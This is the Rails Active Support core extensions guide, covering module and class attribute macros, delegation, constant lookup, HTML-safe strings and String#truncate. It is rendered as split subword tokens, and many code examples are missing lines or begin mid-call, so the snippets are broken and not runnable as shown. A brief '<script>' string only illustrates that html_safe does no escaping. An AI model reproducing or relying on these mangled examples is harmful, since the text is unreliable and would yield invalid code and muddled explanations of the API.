▁alias _ method ▁: process _ with out _ stringified _ params , ▁: process
▁alias _ method ▁: process , ▁: process _ with _ stringified _ params
▁The ▁method ▁` alias _ method _ cha in ` ▁provides ▁a ▁shortcut ▁for ▁that ▁pattern :
▁alias _ method _ cha in ▁: process , ▁: stringified _ params
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / alias ing . rb `.
▁### ▁Attributes
▁#### ▁` alias _ attribute `
▁Model ▁attributes ▁have ▁a ▁reader , ▁a ▁ writer , ▁and ▁a ▁predicate .
▁You ▁can ▁alias ▁a ▁model ▁attribute ▁ having ▁the ▁corresponding ▁three ▁methods ▁defined ▁for ▁you ▁in ▁one ▁sho t .
▁As ▁in ▁other ▁alias ing ▁methods , ▁the ▁new ▁name ▁is ▁the ▁first ▁argument , ▁and ▁the ▁old ▁name ▁is ▁the ▁second ▁( one ▁m n em on ic ▁is ▁that ▁they ▁go ▁in ▁the ▁same ▁order ▁as ▁if ▁you ▁did ▁an ▁assignment ) :
▁# ▁You ▁can ▁refer ▁to ▁the ▁email ▁column ▁as ▁" login ".
▁# ▁This ▁can ▁be ▁meaning ful ▁for ▁authentication ▁code .
▁#### ▁In ter n al ▁Attributes
▁When ▁you ▁are ▁defin ing ▁an ▁attribute ▁in ▁a ▁class ▁that ▁is ▁mean t ▁to ▁be ▁sub class ed , ▁name ▁co ll is ion s ▁are ▁a ▁risk .
▁That ' s ▁re m ar k ably ▁important ▁for ▁libraries .
▁Active ▁Support ▁defines ▁the ▁macro s ▁` attr _ internal _ reader `, ▁` attr _ internal _ writer `, ▁and ▁` attr _ internal _ accessor `.
▁They ▁be ha ve ▁like ▁their ▁Ruby ▁built - in ▁` attr _ * ` ▁ counter part s , ▁except ▁they ▁name ▁the ▁under ly ing ▁instance ▁variable ▁in ▁a ▁way ▁that ▁make s ▁co ll is ion s ▁less ▁likely .
▁The ▁macro ▁` attr _ internal ` ▁is ▁a ▁ s y n on y m ▁for ▁` attr _ internal _ accessor ` :
▁# ▁library
▁class ▁T h ir d Part y Library :: C raw ler
▁ attr _ internal ▁: log _ level
▁# ▁client ▁code
▁class ▁My C raw ler ▁< ▁T h ir d Part y Library :: C raw ler
▁ attr _ accessor ▁: log _ level
▁In ▁the ▁previous ▁example ▁it ▁could ▁be ▁the ▁case ▁that ▁`: log _ level ` ▁does ▁not ▁be long ▁to ▁the ▁public ▁interface ▁of ▁the ▁library ▁and ▁it ▁is ▁only ▁used ▁for ▁development .
▁The ▁client ▁code , ▁un a w a re ▁of ▁the ▁potential ▁con f li c t , ▁ subclasses ▁and ▁defines ▁its ▁own ▁`: log _ level `.
▁By ▁default ▁the ▁internal ▁instance ▁variable ▁is ▁named ▁with ▁a ▁leading ▁ underscore , ▁`@ _ log _ level ` ▁in ▁the ▁example ▁above .
▁That ' s ▁config ur able ▁via ▁` Module . attr _ internal _ n am ing _ format ` ▁though , ▁you ▁can ▁pass ▁any ▁` s print f ` - like ▁format ▁string ▁with ▁a ▁leading ▁`@ ` ▁and ▁a ▁` % s ` ▁some where , ▁which ▁is ▁where ▁the ▁name ▁will ▁be ▁placed .
▁The ▁default ▁is ▁` " @ _ % s " `.
▁Rails ▁uses ▁internal ▁attributes ▁in ▁a ▁few ▁spot s , ▁for ▁examples ▁for ▁views :
▁module ▁ ActionView
▁class ▁ Base
▁ attr _ internal ▁: ca p t ure s
▁ attr _ internal ▁: request , ▁: layout
▁ attr _ internal ▁: controller , ▁: template
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / attr _ internal . rb `.
▁#### ▁ Module ▁Attributes
▁The ▁macro s ▁` m attr _ reader `, ▁` m attr _ writer `, ▁and ▁` m attr _ accessor ` ▁are ▁the ▁same ▁as ▁the ▁` c attr _ * ` ▁macro s ▁defined ▁for ▁class .
▁In ▁fact , ▁the ▁` c attr _ * ` ▁macro s ▁are ▁just ▁alias es ▁for ▁the ▁` m attr _ * ` ▁macro s .
▁Check ▁[ Class ▁Attributes ](# class - attributes ).
▁For ▁example , ▁the ▁dependencies ▁ mechanism ▁uses ▁them :
▁module ▁ ActiveSupport
▁module ▁De p end en c ies
▁m attr _ accessor ▁: warning s _ on _ first _ load
▁m attr _ accessor ▁: history
▁m attr _ accessor ▁: load ed
▁m attr _ accessor ▁: mechanism
▁m attr _ accessor ▁: load _ path s
▁m attr _ accessor ▁: load _ on ce _ path s
▁m attr _ accessor ▁: autoload ed _ constant s
▁m attr _ accessor ▁: e xplicit ly _ un load able _ constant s
▁m attr _ accessor ▁: logger
▁m attr _ accessor ▁: log _ ac t i v ity
▁m attr _ accessor ▁: constant _ watch _ stack
▁m attr _ accessor ▁: constant _ watch _ stack _ m ute x
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / attribute _ accessor s . rb `.
▁### ▁P ar ent s
▁#### ▁` parent `
▁The ▁` parent ` ▁method ▁on ▁a ▁nested ▁named ▁module ▁returns ▁the ▁module ▁that ▁contains ▁its ▁corresponding ▁constant :
▁module ▁ X
▁module ▁ Y
▁module ▁ Z
▁M ▁= ▁ X :: Y :: Z
▁ X :: Y :: Z . parent ▁# ▁=> ▁ X :: Y
▁M . parent ▁# ▁=> ▁ X :: Y
▁If ▁the ▁module ▁is ▁ anonymous ▁or ▁belongs ▁to ▁the ▁to p - level , ▁` parent ` ▁returns ▁` Object `.
▁WARNING : ▁Note ▁that ▁in ▁that ▁case ▁` parent _ name ` ▁returns ▁` nil `.
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / in tr o s p ection . rb `.
▁#### ▁` parent _ name `
▁The ▁` parent _ name ` ▁method ▁on ▁a ▁nested ▁named ▁module ▁returns ▁the ▁fully - qualified ▁name ▁of ▁the ▁module ▁that ▁contains ▁its ▁corresponding ▁constant :
▁ X :: Y :: Z . parent _ name ▁# ▁=> ▁" X :: Y "
▁M . parent _ name ▁# ▁=> ▁" X :: Y "
▁For ▁to p - level ▁or ▁ anonymous ▁module s ▁` parent _ name ` ▁returns ▁` nil `.
▁WARNING : ▁Note ▁that ▁in ▁that ▁case ▁` parent ` ▁returns ▁` Object `.
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / in tr o s p ection . rb `.
▁#### ▁` parent s `
▁The ▁method ▁` parent s ` ▁calls ▁` parent ` ▁on ▁the ▁receiver ▁and ▁up w ar d s ▁un til ▁` Object ` ▁is ▁reach ed .
▁The ▁chain ▁is ▁returned ▁in ▁an ▁array , ▁from ▁bottom ▁to ▁to p :
▁ X :: Y :: Z . parent s ▁# ▁=> ▁[ X :: Y , ▁ X , ▁Object ]
▁M . parent s ▁# ▁=> ▁[ X :: Y , ▁ X , ▁Object ]
▁### ▁Co n st ant s
▁The ▁method ▁` local _ constant s ` ▁returns ▁the ▁names ▁of ▁the ▁constant s ▁that ▁have ▁been < n > defined ▁in ▁the ▁receiver ▁module :
▁ X 1 ▁= ▁1
▁ X 2 ▁= ▁2
▁ Y 1 ▁= ▁: y 1
▁ X 1 ▁= ▁: over r id es _ X 1 _ a b o ve
▁ X . local _ constant s ▁# ▁=> ▁[ : X 1, ▁: X 2 , ▁: Y ]
▁ X :: Y . local _ constant s ▁# ▁=> ▁[ : Y 1, ▁: X 1 ]
▁The ▁names ▁are ▁returned ▁as ▁symbols .
▁#### ▁ Q u al if i ed ▁Co n st ant ▁Name s
▁Active ▁Support ▁extend s ▁this ▁API ▁to ▁be ▁able ▁to ▁pass < n > relative ▁ qualified ▁constant ▁names .
▁The ▁new ▁methods ▁are ▁` qualified _ const _ defined ?` , ▁` qualified _ const _ get `, ▁and < n >` qualified _ const _ set `.
▁The ir ▁arguments ▁are ▁assume d ▁to ▁be ▁ qualified ▁constant < n > name s ▁relative ▁to ▁their ▁receiver :
▁Object . qualified _ const _ defined ? (" Math :: P I ") ▁# ▁=> ▁true
▁Object . qualified _ const _ get (" Math :: P I ") ▁# ▁=> ▁3.1 4 1 59 2 6 5 3 5 89 7 9 3
▁Object . qualified _ const _ set (" Math :: P h i ", ▁1. 6 18 0 34 ) ▁# ▁=> ▁1. 6 18 0 34
▁A r g u ment s ▁may ▁be ▁bar e ▁constant ▁names :
▁ Math . qualified _ const _ get (" E ") ▁# ▁=> ▁2 . 7 18 28 18 28 4 59 04 5
▁These ▁methods ▁are ▁analogous ▁to ▁their ▁built - in ▁ counter part s .
▁In ▁particular ,< n >` qualified _ constant _ defined ?` ▁accept s ▁an ▁optional ▁second ▁argument ▁to ▁be < n > able ▁to ▁say ▁whether ▁you ▁want ▁the ▁predicate ▁to ▁look ▁in ▁the ▁ ance st or s .
▁This ▁flag ▁is ▁take n ▁into ▁account ▁for ▁each ▁constant ▁in ▁the ▁expression ▁while < n > w al k ing ▁down ▁the ▁path .
▁For ▁example , ▁given
▁module ▁M
▁ X ▁= ▁1
▁module ▁N
▁class ▁C
▁include ▁M
▁` qualified _ const _ defined ?` ▁be ha ve s ▁this ▁way :
▁C :: X ", ▁false ) ▁# ▁=> ▁false
▁C :: X ", ▁true ) ▁# ▁=> ▁true
▁C :: X ") ▁# ▁=> ▁true
▁As ▁the ▁last ▁example ▁implie s , ▁the ▁second ▁argument ▁defaults ▁to ▁true ,< n > as ▁in ▁` const _ defined ?` .
▁For ▁co h er ence ▁with ▁the ▁built - in ▁methods ▁only ▁relative ▁paths ▁are ▁accepted .
▁A b s ol ute ▁ qualified ▁constant ▁names ▁like ▁`: : Math :: P I ` ▁raise ▁` Name Error `.
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / qualified _ const . rb `.
▁### ▁R each able
▁A ▁named ▁module ▁is ▁ reachable ▁if ▁it ▁is ▁store d ▁in ▁its ▁corresponding ▁constant .
▁It ▁means ▁you ▁can ▁reach ▁the ▁module ▁object ▁via ▁the ▁constant .
▁That ▁is ▁what ▁or dinarily ▁happens , ▁if ▁a ▁module ▁is ▁called ▁" M ", ▁the ▁` M ` ▁constant ▁exists ▁and ▁hold s ▁it :
▁M . reachable ?
▁But ▁since ▁constant s ▁and ▁module s ▁are ▁in de ed ▁kind ▁of ▁ de co up l ed , ▁module ▁objects ▁can ▁become ▁un reachable :
▁or ph an ▁= ▁Object . s end (: remove _ const , ▁: M )
▁# ▁The ▁module ▁object ▁is ▁or ph an ▁now ▁but ▁it ▁ still ▁has ▁a ▁name .
▁or ph an . name ▁# ▁=> ▁" M "
▁# ▁You ▁cannot ▁reach ▁it ▁via ▁the ▁constant ▁M ▁because ▁it ▁does ▁not ▁even ▁exist .
▁or ph an . reachable ?
▁# ▁Let ' s ▁define ▁a ▁module ▁called ▁" M " ▁again .
▁# ▁The ▁constant ▁M ▁exists ▁now ▁again , ▁and ▁it ▁store s ▁a ▁module
▁# ▁object ▁called ▁" M ", ▁but ▁it ▁is ▁a ▁new ▁instance .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / reachable . rb `.
▁### ▁An on y m ous
▁A ▁module ▁may ▁or ▁may ▁not ▁have ▁a ▁name :
▁M . name ▁# ▁=> ▁" M "
▁N ▁= ▁ Module . new
▁N . name ▁# ▁=> ▁" N "
▁ Module . new . name ▁# ▁=> ▁nil
▁You ▁can ▁check ▁whether ▁a ▁module ▁has ▁a ▁name ▁with ▁the ▁predicate ▁` anonymous ?` :
▁ Module . new . anonymous ?
▁Note ▁that ▁being ▁un reachable ▁does ▁not ▁i mp ly ▁being ▁ anonymous :
▁m ▁= ▁Object . s end (: remove _ const , ▁: M )
▁m . reachable ?
▁m . anonymous ?
▁though ▁an ▁ anonymous ▁module ▁is ▁un reachable ▁by ▁definition .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / anonymous . rb `.
▁### ▁ Method ▁De le g ation
▁The ▁macro ▁` de le g ate ` ▁offer s ▁an ▁easy ▁way ▁to ▁forward ▁methods .
▁Let ' s ▁i ma g ine ▁that ▁users ▁in ▁some ▁application ▁have ▁login ▁information ▁in ▁the ▁` User ` ▁model ▁but ▁name ▁and ▁other ▁data ▁in ▁a ▁separate ▁` Pro file ` ▁model :
▁has _ one ▁: profile
▁With ▁that ▁configuration ▁you ▁get ▁a ▁user ' s ▁name ▁via ▁their ▁profile , ▁` user . profile . name `, ▁but ▁it ▁could ▁be ▁hand y ▁to ▁ still ▁be ▁able ▁to ▁access ▁such ▁attribute ▁directly :
▁profile . name
▁That ▁is ▁what ▁` de le g ate ` ▁does ▁for ▁you :
▁delegate ▁: name , ▁to : ▁: profile
▁It ▁is ▁short er , ▁and ▁the ▁in t ent ion ▁more ▁obvious .
▁The ▁method ▁must ▁be ▁public ▁in ▁the ▁target .
▁The ▁` de le g ate ` ▁macro ▁accept s ▁sever al ▁methods :
▁delegate ▁: name , ▁: age , ▁: address , ▁: twitter , ▁to : ▁: profile
▁When ▁interpolate d ▁into ▁a ▁string , ▁the ▁`: to ` ▁option ▁should ▁become ▁an ▁expression ▁that ▁evaluate s ▁to ▁the ▁object ▁the ▁method ▁is ▁delegate d ▁to .
▁T ypically ▁a ▁string ▁or ▁symbol .
▁Such ▁an ▁expression ▁is ▁evaluated ▁in ▁the ▁context ▁of ▁the ▁receiver :
▁# ▁delegate s ▁to ▁the ▁Rails ▁constant
▁delegate ▁: logger , ▁to : ▁: Rails
▁# ▁delegate s ▁to ▁the ▁receiver ' s ▁class
▁delegate ▁: table _ name , ▁to : ▁: class
▁WARNING : ▁If ▁the ▁`: prefix ` ▁option ▁is ▁` true ` ▁this ▁is ▁less ▁generic , ▁see ▁below .
▁By ▁default , ▁if ▁the ▁d el eg ation ▁raise s ▁` NoMethodError ` ▁and ▁the ▁target ▁is ▁` nil ` ▁the ▁exception ▁is ▁pro p a g at ed .
▁You ▁can ▁as k ▁that ▁` nil ` ▁is ▁returned ▁instead ▁with ▁the ▁`: allow _ nil ` ▁option :
▁delegate ▁: name , ▁to : ▁: profile , ▁allow _ nil : ▁true
▁With ▁`: allow _ nil ` ▁the ▁call ▁` user . name ` ▁returns ▁` nil ` ▁if ▁the ▁user ▁has ▁no ▁profile .
▁The ▁option ▁`: prefix ` ▁add s ▁a ▁prefix ▁to ▁the ▁name ▁of ▁the ▁generated ▁method .
▁This ▁may ▁be ▁hand y ▁for ▁example ▁to ▁get ▁a ▁better ▁name :
▁delegate ▁: s tree t , ▁to : ▁: address , ▁prefix : ▁true
▁The ▁previous ▁example ▁generates ▁` address _ s tree t ` ▁rather ▁than ▁` s tree t `.
▁WARNING : ▁S ince ▁in ▁this ▁case ▁the ▁name ▁of ▁the ▁generated ▁method ▁is ▁composed ▁of ▁the ▁target ▁object ▁and ▁target ▁method ▁names , ▁the ▁`: to ` ▁option ▁must ▁be ▁a ▁method ▁name .
▁A ▁custom ▁prefix ▁may ▁also ▁be ▁configured :
▁delegate ▁: size , ▁to : ▁: attachment , ▁prefix : ▁: avatar
▁In ▁the ▁previous ▁example ▁the ▁macro ▁generates ▁` avatar _ size ` ▁rather ▁than ▁` size `.
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / de le g ation . rb `
▁### ▁Re de f in ing ▁ Method s
▁There ▁are ▁cases ▁where ▁you ▁need ▁to ▁define ▁a ▁method ▁with ▁` define _ method `, ▁but ▁don ' t ▁know ▁whether ▁a ▁method ▁with ▁that ▁name ▁already ▁exists .
▁If ▁it ▁does , ▁a ▁warning ▁is ▁issue d ▁if ▁they ▁are ▁enabled .
▁No ▁big ▁deal , ▁but ▁not ▁clean ▁either .
▁The ▁method ▁` re define _ method ` ▁prevent s ▁such ▁a ▁potential ▁warning , ▁remov ing ▁the ▁existing ▁method ▁before ▁if ▁needed .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / remove _ method . rb `
▁Extensions ▁to ▁` Class `
▁### ▁ Class ▁Attributes
▁#### ▁` class _ attribute `
▁The ▁method ▁` class _ attribute ` ▁declare s ▁one ▁or ▁more ▁inherit able ▁class ▁attributes ▁that ▁can ▁be ▁overrid de n ▁at ▁any ▁level ▁down ▁the ▁hierarchy .
▁class _ attribute ▁: x
▁class ▁B ▁< ▁A ; ▁end
▁class ▁C ▁< ▁B ; ▁end
▁A . x ▁= ▁: a
▁B . x ▁# ▁=> ▁: a
▁C . x ▁# ▁=> ▁: a
▁B . x ▁= ▁: b
▁A . x ▁# ▁=> ▁: a
▁C . x ▁# ▁=> ▁: b
▁C . x ▁= ▁: c
▁B . x ▁# ▁=> ▁: b
▁For ▁example ▁` ActionMailer :: Base ` ▁defines :
▁class _ attribute ▁: default _ params
▁self . default _ params ▁= ▁ {
▁ mime _ version : ▁" 1 . 0 ",
▁ cha r set : ▁" UT F -8 ",
▁content _ type : ▁" text / plain ",
▁parts _ order : ▁[ ▁" text / plain ", ▁" text / en r ic h ed ", ▁" text / html " ▁ ]
▁ }. free z e
▁They ▁can ▁also ▁be ▁access ed ▁and ▁overrid de n ▁at ▁the ▁instance ▁level .
▁A . x ▁= ▁1
▁a 1 ▁= ▁A . new
▁a 2 ▁= ▁A . new
▁a 2 . x ▁= ▁2
▁a 1 . x ▁# ▁=> ▁1, ▁comes ▁from ▁A
▁a 2 . x ▁# ▁=> ▁2, ▁overrid de n ▁in ▁a 2
▁The ▁generation ▁of ▁the ▁ writer ▁instance ▁method ▁can ▁be ▁prevent ed ▁by ▁setting ▁the ▁option ▁`: instance _ writer ` ▁to ▁` false `.
▁module ▁ActiveRecord
▁class _ attribute ▁: table _ name _ prefix , ▁instance _ writer : ▁false
▁self . table _ name _ prefix ▁= ▁" "
▁A ▁model ▁may ▁find ▁that ▁option ▁useful ▁as ▁a ▁way ▁to ▁prevent ▁ mass - assignment ▁from ▁setting ▁the ▁attribute .
▁The ▁generation ▁of ▁the ▁reader ▁instance ▁method ▁can ▁be ▁prevent ed ▁by ▁setting ▁the ▁option ▁`: instance _ reader ` ▁to ▁` false `.
▁class _ attribute ▁: x , ▁instance _ reader : ▁false
▁A . new . x ▁= ▁1 ▁# ▁ NoMethodError
▁For ▁convenience ▁` class _ attribute ` ▁also ▁defines ▁an ▁instance ▁predicate ▁which ▁is ▁the ▁double ▁ n eg ation ▁of ▁what ▁the ▁instance ▁reader ▁returns .
▁In ▁the ▁examples ▁above ▁it ▁would ▁be ▁called ▁` x ?` .
▁When ▁`: instance _ reader ` ▁is ▁` false `, ▁the ▁instance ▁predicate ▁returns ▁a ▁` NoMethodError ` ▁just ▁like ▁the ▁reader ▁method .
▁If ▁you ▁do ▁not ▁want ▁the ▁instance ▁predicate , ▁pass ▁` instance _ pre d ic ate : ▁false ` ▁and ▁it ▁will ▁not ▁be ▁defined .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / class / attribute . rb `
▁#### ▁` c attr _ reader `, ▁` c attr _ writer `, ▁and ▁` c attr _ accessor `
▁The ▁macro s ▁` c attr _ reader `, ▁` c attr _ writer `, ▁and ▁` c attr _ accessor ` ▁are ▁analogous ▁to ▁their ▁` attr _ * ` ▁ counter part s ▁but ▁for ▁classes .
▁They ▁initialize ▁a ▁class ▁variable ▁to ▁` nil ` ▁unless ▁it ▁already ▁exists , ▁and ▁generate ▁the ▁corresponding ▁class ▁methods ▁to ▁access ▁it :
▁class ▁My sql A d ap ter ▁< ▁ Abstract A d ap ter
▁# ▁Generate s ▁class ▁methods ▁to ▁access ▁@ @ emulate _ boolean s .
▁c attr _ accessor ▁: emulate _ boolean s
▁self . emulate _ boolean s ▁= ▁true
▁In st ance ▁methods ▁are ▁created ▁as ▁well ▁for ▁convenience , ▁they ▁are ▁just ▁pro x ies ▁to ▁the ▁class ▁attribute .
▁So , ▁instance s ▁can ▁change ▁the ▁class ▁attribute , ▁but ▁cannot ▁override ▁it ▁as ▁it ▁happens ▁with ▁` class _ attribute ` ▁( see ▁above ).
▁For ▁example ▁given
▁c attr _ accessor ▁: field _ error _ proc
▁@ @ field _ error _ proc ▁= ▁ Proc . new { ▁... ▁ }
▁we ▁can ▁access ▁` field _ error _ proc ` ▁in ▁views .
▁Also , ▁you ▁can ▁pass ▁a ▁block ▁to ▁` c attr _ * ` ▁to ▁set ▁up ▁the ▁attribute ▁with ▁a ▁default ▁value :
▁# ▁Generate s ▁class ▁methods ▁to ▁access ▁@ @ emulate _ boolean s ▁with ▁default ▁value ▁of ▁true .
▁c attr _ accessor (: emulate _ boolean s ) ▁ { ▁true ▁ }
▁The ▁generation ▁of ▁the ▁reader ▁instance ▁method ▁can ▁be ▁prevent ed ▁by ▁setting ▁`: instance _ reader ` ▁to ▁` false ` ▁and ▁the ▁generation ▁of ▁the ▁ writer ▁instance ▁method ▁can ▁be ▁prevent ed ▁by ▁setting ▁`: instance _ writer ` ▁to ▁` false `.
▁Generat ion ▁of ▁both ▁methods ▁can ▁be ▁prevent ed ▁by ▁setting ▁`: instance _ accessor ` ▁to ▁` false `.
▁In ▁all ▁cases , ▁the ▁value ▁must ▁be ▁exactly ▁` false ` ▁and ▁not ▁any ▁false ▁value .
▁module ▁A
▁class ▁B
▁# ▁No ▁first _ name ▁instance ▁reader ▁is ▁generated .
▁c attr _ accessor ▁: first _ name , ▁instance _ reader : ▁false
▁# ▁No ▁last _ name = ▁instance ▁ writer ▁is ▁generated .
▁c attr _ accessor ▁: last _ name , ▁instance _ writer : ▁false
▁# ▁No ▁ s ur name ▁instance ▁reader ▁or ▁ s ur name = ▁ writer ▁is ▁generated .
▁c attr _ accessor ▁: s ur name , ▁instance _ accessor : ▁false
▁A ▁model ▁may ▁find ▁it ▁useful ▁to ▁set ▁`: instance _ accessor ` ▁to ▁` false ` ▁as ▁a ▁way ▁to ▁prevent ▁ mass - assignment ▁from ▁setting ▁the ▁attribute .
▁### ▁S u b classes ▁ & ▁De sc end ant s
▁#### ▁` subclasses `
▁The ▁` subclasses ` ▁method ▁returns ▁the ▁ subclasses ▁of ▁the ▁receiver :
▁class ▁C ; ▁end
▁C . subclasses ▁# ▁=> ▁[]
▁class ▁B ▁< ▁C ; ▁end
▁C . subclasses ▁# ▁=> ▁[ B ]
▁class ▁A ▁< ▁B ; ▁end
▁class ▁D ▁< ▁C ; ▁end
▁C . subclasses ▁# ▁=> ▁[ B , ▁D ]
▁The ▁order ▁in ▁which ▁these ▁classes ▁are ▁returned ▁is ▁un spec if i ed .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / class / subclasses . rb `.
▁#### ▁` descendants `
▁The ▁` descendants ` ▁method ▁returns ▁all ▁classes ▁that ▁are ▁` < ` ▁than ▁its ▁receiver :
▁C . descendants ▁# ▁=> ▁[]
▁C . descendants ▁# ▁=> ▁[ B ]
▁C . descendants ▁# ▁=> ▁[ B , ▁A ]
▁C . descendants ▁# ▁=> ▁[ B , ▁A , ▁D ]
▁Extensions ▁to ▁` String `
▁### ▁Ou t put ▁Safe t y
▁#### ▁Mo t i v ation
▁In s er ting ▁data ▁into ▁HTML ▁templates ▁needs ▁extra ▁care .
▁For ▁example , ▁you ▁can ' t ▁just ▁interpolate ▁`@ re view . title ` ▁verb at i m ▁into ▁an ▁HTML ▁page .
▁For ▁one ▁thing , ▁if ▁the ▁review ▁title ▁is ▁" F la n a g an ▁ & ▁M at z ▁rules !" ▁the ▁output ▁won ' t ▁be ▁well - form ed ▁because ▁an ▁a mp ers and ▁has ▁to ▁be ▁escape d ▁as ▁" & am p ; am p ; ".
▁What ' s ▁more , ▁depending ▁on ▁the ▁application , ▁that ▁may ▁be ▁a ▁big ▁security ▁hole ▁because ▁users ▁can ▁inject ▁ malicious ▁HTML ▁setting ▁a ▁hand - craft ed ▁review ▁title .
▁Check ▁out ▁the ▁section ▁about ▁c ross - site ▁ script ing ▁in ▁the ▁[ Security ▁guide ]( security . html # c ross - site - script ing - x s s ) ▁for ▁further ▁information ▁about ▁the ▁risk s .
▁#### ▁Safe ▁ String s
▁Active ▁Support ▁has ▁the ▁ concept ▁of ▁ _ ( html ) ▁safe _ ▁strings .
▁A ▁safe ▁string ▁is ▁one ▁that ▁is ▁ marked ▁as ▁being ▁insert able ▁into ▁HTML ▁as ▁is .
▁It ▁is ▁tr us t ed , ▁no ▁matter ▁whether ▁it ▁has ▁been ▁escape d ▁or ▁not .
▁ String s ▁are ▁consider ed ▁to ▁be ▁ _ un safe _ ▁by ▁default :
▁" ". html _ safe ?
▁You ▁can ▁obtain ▁a ▁safe ▁string ▁from ▁a ▁given ▁one ▁with ▁the ▁` html _ safe ` ▁method :
▁ s ▁= ▁" ". html _ safe
▁ s . html _ safe ?
▁It ▁is ▁important ▁to ▁understand ▁that ▁` html _ safe ` ▁perform s ▁no ▁es ca p ing ▁what so ever , ▁it ▁is ▁just ▁an ▁assertion :
▁ s ▁= ▁" < script > . . . </ script > ". html _ safe
▁ s ▁# ▁=> ▁" < script > . . . </ script > "
▁It ▁is ▁your ▁responsib il ity ▁to ▁ensure ▁calling ▁` html _ safe ` ▁on ▁a ▁particular ▁string ▁is ▁fine .
▁If ▁you ▁app end ▁on to ▁a ▁safe ▁string , ▁either ▁in - place ▁with ▁` concat ` / `< < `, ▁or ▁with ▁` + `, ▁the ▁result ▁is ▁a ▁safe ▁string .
▁Un safe ▁arguments ▁are ▁escape d :
▁" ". html _ safe ▁ + ▁" < " ▁# ▁=> ▁" & lt ; "
▁Safe ▁arguments ▁are ▁directly ▁app end ed :
▁" ". html _ safe ▁ + ▁" < ". html _ safe ▁# ▁=> ▁" < "
▁These ▁methods ▁should ▁not ▁be ▁used ▁in ▁ordinar y ▁views .
▁Un safe ▁values ▁are ▁automatically ▁escape d :
▁<%= ▁@ re view . title ▁%> ▁<% # ▁fine , ▁escape d ▁if ▁needed ▁%>
▁To ▁insert ▁something ▁verb at i m ▁use ▁the ▁` raw ` ▁helper ▁rather ▁than ▁calling ▁` html _ safe ` :
▁<%= ▁raw ▁@ c m s . current _ template ▁%> ▁<% # ▁insert s ▁@ c m s . current _ template ▁as ▁is ▁%>
▁or , ▁equivalent ly , ▁use ▁` <%= = ` :
▁<%= = ▁@ c m s . current _ template ▁%> ▁<% # ▁insert s ▁@ c m s . current _ template ▁as ▁is ▁%>
▁The ▁` raw ` ▁helper ▁calls ▁` html _ safe ` ▁for ▁you :
▁def ▁raw ( string is h )
▁string is h . to _ s . html _ safe
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / out put _ safety . rb `.
▁#### ▁ Trans form ation
▁As ▁a ▁rule ▁of ▁thumb , ▁except ▁p erhaps ▁for ▁ concat en ation ▁as ▁explained ▁above , ▁any ▁method ▁that ▁may ▁change ▁a ▁string ▁gives ▁you ▁an ▁un safe ▁string .
▁These ▁are ▁` downcase `, ▁` g sub `, ▁` str ip `, ▁` ch o mp `, ▁` underscore `, ▁etc .
▁In ▁the ▁case ▁of ▁in - place ▁ transform ation s ▁like ▁` g sub !` ▁the ▁receiver ▁itself ▁becomes ▁un safe .
▁INFO : ▁The ▁ safety ▁bit ▁is ▁lost ▁always , ▁no ▁matter ▁whether ▁the ▁ transform ation ▁actually ▁changed ▁something .
▁#### ▁Co n version ▁and ▁Co er c ion
▁Call ing ▁` to _ s ` ▁on ▁a ▁safe ▁string ▁returns ▁a ▁safe ▁string , ▁but ▁co er c ion ▁with ▁` to _ str ` ▁returns ▁an ▁un safe ▁string .
▁#### ▁Co p ying
▁Call ing ▁` dup ` ▁or ▁` clone ` ▁on ▁safe ▁strings ▁yields ▁safe ▁strings .
▁### ▁` remove `
▁The ▁method ▁` remove ` ▁will ▁remove ▁all ▁occur r ence s ▁of ▁the ▁pattern :
▁ Hello ▁World "
▁There ' s ▁also ▁the ▁d est ru c tive ▁version ▁` String # remove !` .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / filter s . rb `.
▁### ▁` s q u is h `
▁The ▁method ▁` s q u is h ` ▁ str ips ▁leading ▁and ▁tr ailing ▁whitespace , ▁and ▁sub st it ute s ▁run s ▁of ▁whitespace ▁with ▁a ▁single ▁ space ▁each :
▁" ▁\ n ▁ foo \ n \ r ▁\ t ▁bar ▁\ n ". s q u is h ▁# ▁=> ▁" foo ▁bar "
▁There ' s ▁also ▁the ▁d est ru c tive ▁version ▁` String # s q u is h !` .
▁Note ▁that ▁it ▁handle s ▁both ▁ ASCII ▁and ▁Un i code ▁whitespace .
▁### ▁` truncate `
▁The ▁method ▁` truncate ` ▁returns ▁a ▁copy ▁of ▁its ▁receiver ▁ truncate d ▁after ▁a ▁given ▁` length ` :
▁" O h ▁ de ar ! ▁O h ▁ de ar !
▁I ▁shall ▁be ▁late !" . truncate ( 20 )
▁# ▁=> ▁" O h ▁ de ar !
▁O h ▁ de ar ! ..."
▁E ll ips is ▁can ▁be ▁customize d ▁with ▁the ▁`: o m is s ion ` ▁option :
▁I ▁shall ▁be ▁late !" . truncate ( 20 , ▁omission : ▁' & hel li p ; ')
▁O h ▁ & hel li p ; "
▁Note ▁in ▁particular ▁that ▁tr un c ation ▁take s ▁into ▁account ▁the ▁length ▁of ▁the ▁omission ▁string .
▁Pass ▁a ▁`: separator ` ▁to ▁ truncate ▁the ▁string ▁at ▁a ▁natural ▁break :
▁I ▁shall ▁be ▁late !" . truncate ( 18 )
▁O h ▁ de a ..."
▁I ▁shall ▁be ▁late !" . truncate ( 18 , ▁ separator : ▁' ▁ ')
▁O h ..."
▁The ▁option ▁`: separator ` ▁can ▁be ▁a ▁regex p :
▁I ▁shall ▁be ▁late !" . truncate ( 18 , ▁ separator : ▁/ \ s / )
▁In ▁above ▁examples ▁" de ar " ▁get s ▁ cut ▁first , ▁but ▁the n ▁`: separator ` ▁prevent s ▁it .
▁### ▁` truncate _ words `
▁The ▁method ▁` truncate _ words ` ▁returns ▁a ▁copy ▁of ▁its ▁receiver ▁ truncate d ▁after ▁a ▁given ▁number ▁of ▁words :
